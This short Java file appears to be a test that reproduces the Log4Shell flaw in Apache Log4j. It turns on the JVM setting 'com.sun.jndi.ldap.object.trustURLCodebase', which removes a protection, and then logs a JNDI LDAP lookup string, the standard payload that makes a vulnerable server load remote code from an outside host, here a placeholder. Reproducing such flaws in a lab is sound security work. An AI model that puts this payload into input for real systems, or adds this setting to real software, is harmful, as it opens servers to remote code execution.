package com.example.logdemo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {
    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        logger.error("test");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://url/4fzudm}");
    }
}